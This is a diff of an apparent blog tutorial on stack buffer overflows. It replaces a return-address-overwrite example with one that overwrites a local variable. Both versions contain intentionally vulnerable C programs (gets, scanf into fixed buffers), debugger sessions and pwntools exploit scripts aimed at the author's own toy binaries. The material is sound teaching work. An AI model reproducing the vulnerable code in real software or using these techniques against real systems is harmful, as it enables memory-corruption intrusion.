@@ -1,10 +1,10 @@
 ---
 author: pl4int3xt
 layout: post
-title: Buffer overfl0w 01 - overwrite stack variables & execute unreachable functions
+title: Buffer overfl0w 01 - overwrite stack variables
 date: '2024-01-05'
 # cover: img/cover_images/50.png
-description: "Learn how to overwrite variables in the stack and access unreachable functions using buffer overflow"
+description: "Learn how to overwrite variables in the stack buffer overflow"
 categories: [Binary Exploitation 101]
 tags: [Buffer overflow, binary exploitation]
 ---
@@ -56,7 +56,8 @@ Enter admin password:
 Incorrect Password!
 Failed to log in as Admin (authorised=0) :(
 ```
-## 0verwriting local variables in the stack
+
+## overwriting local variables in the stack
 Let's try entering a long random data and see what's happens
 ```shell
 ~/Documents/coding/c$ ./login
@@ -120,153 +121,160 @@ Successfully logged in as Admin (authorised=103) :)
 ```
 We can see we successfully logged in as Admin. The pwntools will come in handy when exploiting binaries running remotely which will happen in most cases during pwn challenges.
 
-## The unreachable functi0n W4TCHD0G5
+## Overwriting more complicated variables in the stack 
 
-In the following code the watchdogs function cannot be executed by the program since there is no place in the code where it is called.
+Let's take a look at this more complicated code in c
+
 ```c
 #include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
 
-void watchdogs(){
-    printf("Let's play W4tchd0g5");
+void do_input(){
+    int key = 0x12345678;
+    char buffer[32];
+    printf("I heard you are the best lock picker in the town ? ");
+    fflush(stdout);
+    gets(buffer);
+    if(key == 0xdeadbeef){
+        printf("good job!!\n");
+        printf("%04x\n", key);
+        fflush(stdout);
+    }
+    else{
+        printf("%04x\n", key);
+        printf("...\n");
+        fflush(stdout);
+    }
 }
 
-void register_favourite_game(){
-    char buffer[16];
-
-    printf("Enter your favourite video game :\n");
-    scanf("%s", buffer);
-    printf("Your favourite video games is , %s\n", buffer);    
-}
-
-int main(){
-    register_favourite_game();
-
+int main(int argc, char* argv[]){
+    do_input();
     return 0;
 }
 ```
-Again Let's compile the code to an executable binary and remove the protections which might prevent us from exploiting the code. The code is dynamically linked and its not stripped.
+
+it checks if the value of `key == 0xdeadbeef` to print good job. The key is initial set to `0x12345678`. We need to overwrite the value of key and change it to bypass it.
+
+Let's compile the code 
 
 ```shell
-gcc watchdogs.c -o watchdogs -fno-stack-protector -z execstack -no-pie
+gcc lockpicker.c -o lockpicker -fno-stack-protector -no-pie
 ```
-Let's run the program and input our favourite game
-```shell
-~/Documents/coding/c$ ./watchdogs
-Enter your favourite video game :
-Fortnite
-Your favourite video games is , Fortnite
-```
-Let's run the program and input a long character greater than 16 characters
-```
-~/Documents/coding/c$ ./watchdogs
-Enter your favourite video game :
-dafgshkjdljkewucywklbecrtktwveuityikwrntuicw
-Your favourite video games is , dafgshkjdljkewucywklbecrtktwveuityikwrntuicw
-Segmentation fault (core dumped)
-```
-we get a segmentation fault meaning maybe we have overwritten some important variables of the code or the return address. Let's get the (offset) number of characters we need to write before overwritting the return address using pwndbg. We first use cyclic to generate 50 random characters
+
+Let's run the code with pwndbg and disassemble do_input function
 
 ```shell
-~/Documents/coding/c$ pwndbg watchdogs
-Reading symbols from watchdogs...
-(No debugging symbols found in watchdogs)
-Cannot convert between character sets `UTF-32' and `UTF-8'
-pwndbg: loaded 147 pwndbg commands and 46 shell commands. Type pwndbg [--shell | --all] [filter] for a list.
-pwndbg: created $rebase, $ida GDB functions (can be used with print/break)
-------- tip of the day (disable with set show-tips off) -------
-break-if-taken and break-if-not-taken commands sets breakpoints after a given jump instruction was taken or not
+pwndbg> disassemble do_input
+Dump of assembler code for function do_input:
+   0x0000000000401156 <+0>:	push   rbp
+   0x0000000000401157 <+1>:	mov    rbp,rsp
+   0x000000000040115a <+4>:	sub    rsp,0x30
+   0x000000000040115e <+8>:	mov    DWORD PTR [rbp-0x4],0x12345678
+   0x0000000000401165 <+15>:	lea    rax,[rip+0xe9c]        # 0x402008
+   0x000000000040116c <+22>:	mov    rdi,rax
+   0x000000000040116f <+25>:	mov    eax,0x0
+   0x0000000000401174 <+30>:	call   0x401040 <printf@plt>
+   0x0000000000401179 <+35>:	mov    rax,QWORD PTR [rip+0x2eb0]        # 0x404030 <stdout@GLIBC_2.2.5>
+   0x0000000000401180 <+42>:	mov    rdi,rax
+   0x0000000000401183 <+45>:	call   0x401060 <fflush@plt>
+   0x0000000000401188 <+50>:	lea    rax,[rbp-0x30]
+   0x000000000040118c <+54>:	mov    rdi,rax
+   0x000000000040118f <+57>:	mov    eax,0x0
+   0x0000000000401194 <+62>:	call   0x401050 <gets@plt>
+   0x0000000000401199 <+67>:	cmp    DWORD PTR [rbp-0x4],0xdeadbeef
+   0x00000000004011a0 <+74>:	jne    0x4011db <do_input+133>
+   0x00000000004011a2 <+76>:	lea    rax,[rip+0xe93]        # 0x40203c
+   0x00000000004011a9 <+83>:	mov    rdi,rax
+   0x00000000004011ac <+86>:	call   0x401030 <puts@plt>
+   0x00000000004011b1 <+91>:	mov    eax,DWORD PTR [rbp-0x4]
+   0x00000000004011b4 <+94>:	mov    esi,eax
+   0x00000000004011b6 <+96>:	lea    rax,[rip+0xe8a]        # 0x402047
+   0x00000000004011bd <+103>:	mov    rdi,rax
+   0x00000000004011c0 <+106>:	mov    eax,0x0
+   0x00000000004011c5 <+111>:	call   0x401040 <printf@plt>
+   0x00000000004011ca <+116>:	mov    rax,QWORD PTR [rip+0x2e5f]        # 0x404030 <stdout@GLIBC_2.2.5>
+   0x00000000004011d1 <+123>:	mov    rdi,rax
+   0x00000000004011d4 <+126>:	call   0x401060 <fflush@plt>
+   0x00000000004011d9 <+131>:	jmp    0x401212 <do_input+188>
+   0x00000000004011db <+133>:	mov    eax,DWORD PTR [rbp-0x4]
+   0x00000000004011de <+136>:	mov    esi,eax
+   0x00000000004011e0 <+138>:	lea    rax,[rip+0xe60]        # 0x402047
+   0x00000000004011e7 <+145>:	mov    rdi,rax
+   0x00000000004011ea <+148>:	mov    eax,0x0
+   0x00000000004011ef <+153>:	call   0x401040 <printf@plt>
+   0x00000000004011f4 <+158>:	lea    rax,[rip+0xe52]        # 0x40204d
+   0x00000000004011fb <+165>:	mov    rdi,rax
+   0x00000000004011fe <+168>:	call   0x401030 <puts@plt>
+   0x0000000000401203 <+173>:	mov    rax,QWORD PTR [rip+0x2e26]        # 0x404030 <stdout@GLIBC_2.2.5>
+   0x000000000040120a <+180>:	mov    rdi,rax
+   0x000000000040120d <+183>:	call   0x401060 <fflush@plt>
+   0x0000000000401212 <+188>:	nop
+   0x0000000000401213 <+189>:	leave
+   0x0000000000401214 <+190>:	ret
+End of assembler dump.
+```
+
+We find the comparison at `0x0000000000401199 <+67>:	cmp    DWORD PTR [rbp-0x4],0xdeadbeef` so we then set a breakpoint at that address and use cyclic to crash the binary
+
+```shell
 pwndbg> cyclic 50
 aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga
-```
-We then run the program and enter the values we got from cyclic
-```shell
+pwndbg> b *0x0000000000401199
+Note: breakpoint 1 also set at pc 0x401199.
+Breakpoint 2 at 0x401199
 pwndbg> run
-Starting program: /home/pl4int3xt/Documents/coding/c/watchdogs 
+Starting program: /home/pl4int3xt/Documents/pwn/shellcode/lockpicker 
 [Thread debugging using libthread_db enabled]
-Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
-Enter your favourite video game :
-aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga
+Using host libthread_db library "/usr/lib/libthread_db.so.1".
+I heard you are the best lock picker in the town ? aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga
+
+Breakpoint 1, 0x0000000000401199 in do_input ()
 ```
-The executable with crash and we will be able to see this as part of the REGISTERS output
+
+Let's check the values in `rbp-4` and use cyclic to get the offset
+
 ```shell
-*R13  0x7fffffffdf58 —▸ 0x7fffffffe2d1 ◂— 'SHELL=/bin/bash'
-*R14  0x403e18 (__do_global_dtors_aux_fini_array_entry) —▸ 0x401110 (__do_global_dtors_aux) ◂— endbr64 
-*R15  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2d0 ◂— 0x0
-*RBP  0x6161616161616163 ('caaaaaaa')
-*RSP  0x7fffffffde28 ◂— 'daaaaaaaeaaaaaaafaaaaaaaga'
-*RIP  0x4011b3 (register_favourite_game+83) ◂— ret 
+pwndbg> x/s $rbp-4
+0x7fffffffe63c:	"aaaaga"
+pwndbg> cyclic -l aaaagaaa
+Finding cyclic pattern of 8 bytes: b'aaaagaaa' (hex: 0x6161616167616161)
+Found at offset 44
 ```
-since this is a 64bit binary we need to get the first 8 values of RSP `daaaaaaa` since they are the characters which would have made it to the RIP. We use cyclic to lookup the characters
-```shell
-pwndbg> cyclic -l daaaaaaa
-Finding cyclic pattern of 8 bytes: b'daaaaaaa' (hex: 0x6461616161616161)
-Found at offset 24
-```
-We will put 24 random characters before overwriting the return address. Let's create a python script to automate this
+
+Let's create a python script to overwrite the `rbp-4` register with our desired value in the little endian byte order
+
 ```python
 from pwn import *
+from struct import *
 
-# Allows you to switch between local/GDB/remote from terminal
-def start(argv=[], *a, **kw):
-    if args.GDB:  # Set GDBscript below
-        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
-    elif args.REMOTE:  # ('server', 'port')
-        return remote(sys.argv[1], sys.argv[2], *a, **kw)
-    else:  # Run locally
-        return process([exe] + argv, *a, **kw)
+# Start program
+io = process('./lockpicker')
 
-# Set up pwntools for the correct architecture
-exe = './watchdogs'
-# This will automatically get context arch, bits, os etc
-elf = context.binary = ELF(exe, checksec=False)
-# Change logging level to help with debugging (error/warning/info/debug)
-context.log_level = 'debug'
+padding = 44
 
-# Start the executable
-io = start()
-
-# How many bytes to the instruction pointer (RIP)?
-padding = 24
+rbp_4 = pack("<I", 0xdeadbeef)
 
 payload = flat(
-    b'A' * 24,
-    elf.functions.watchdogs  # 0x00401146
+    asm('nop') * padding,
+    rbp_4
 )
 
-# Save the payload to file
 write('payload', payload)
+# Send string to overflow buffer
+io.sendlineafter(b'?', payload)
 
-# Send the payload
-io.sendlineafter(b':', payload)
-
-# Receive the flag
-io.interactive()
+# Receive output
+print(io.recvall().decode())
 ```
-Let's run the code and see the output
+
+Let's run the script to overwrite the variable
+
 ```shell
-~/Documents/coding/c$ python3 watchdogs.py
-[+] Starting local process './watchdogs': pid 48776
-[DEBUG] Received 0x22 bytes:
-    b'Enter your favourite video game :\n'
-[DEBUG] Sent 0x21 bytes:
-    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
-    00000010  41 41 41 41  41 41 41 41  46 11 40 00  00 00 00 00  │AAAA│AAAA│F·@·│····│
-    00000020  0a                                                  │·│
-    00000021
-[*] Switching to interactive mode
-
-[DEBUG] Received 0x53 bytes:
-    00000000  59 6f 75 72  20 66 61 76  6f 75 72 69  74 65 20 76  │Your│ fav│ouri│te v│
-    00000010  69 64 65 6f  20 67 61 6d  65 73 20 69  73 20 2c 20  │ideo│ gam│es i│s , │
-    00000020  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
-    00000030  41 41 41 41  41 41 41 41  46 11 40 0a  4c 65 74 27  │AAAA│AAAA│F·@·│Let'│
-    00000040  73 20 70 6c  61 79 20 57  34 74 63 68  64 30 67 35  │s pl│ay W│4tch│d0g5│
-    00000050  3a 4f 0a                                            │:O·│
-    00000053
-Your favourite video games is , AAAAAAAAAAAAAAAAAAAAAAAAF\x11@
-Let's play W4tchd0g5
-[*] Got EOF while reading in interactive
-$ 
-[*] Process './watchdogs' stopped with exit code -11 (SIGSEGV) (pid 48776)
+pl4int3xt@archlinux ~/D/p/shellcode [1]> python3 lockpicker.py
+[+] Starting local process './lockpicker': pid 25981
+[+] Receiving all data: Done (21B)
+[*] Process './lockpicker' stopped with exit code -11 (SIGSEGV) (pid 25981)
+ good job!!
+deadbeef
 ```
-We were able to execute our unreachable function W4TCHD0G5
